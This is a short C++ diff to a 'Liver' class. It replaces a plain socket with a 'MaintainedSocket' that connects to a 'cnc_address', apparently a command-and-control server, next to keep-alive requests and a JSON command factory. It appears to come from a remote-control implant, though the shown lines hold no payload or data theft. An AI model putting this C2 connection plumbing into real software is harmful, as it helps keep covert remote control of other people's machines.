@@ -8,8 +8,7 @@
 #include "Communicators/RawCommunicator.hpp"
 #include "Communicators/Protocol/KeepAliveRequest.hpp"
 #include "Communicators/Protocol/SendRandomResponse.hpp"
-#include "Filesystem/File.hpp"
-#include "Networking/Socket.hpp"
+#include "Networking/MaintainedSocket.hpp"
 #include "Synchronization/Event.hpp"
 
 Liver::Liver(Event::Ptr quit_event,
@@ -71,7 +70,7 @@ std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_config
 	return std::make_unique<Liver>(
 		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
 		std::make_unique<JsonCommandFactory>(),
-		RawCommunicator::from_stream(std::make_shared<Socket>(cnc_address)),
+		RawCommunicator::from_stream(std::make_shared<MaintainedSocket>(cnc_address)),
 		ITERATION_TIMEOUT
 	);
 }
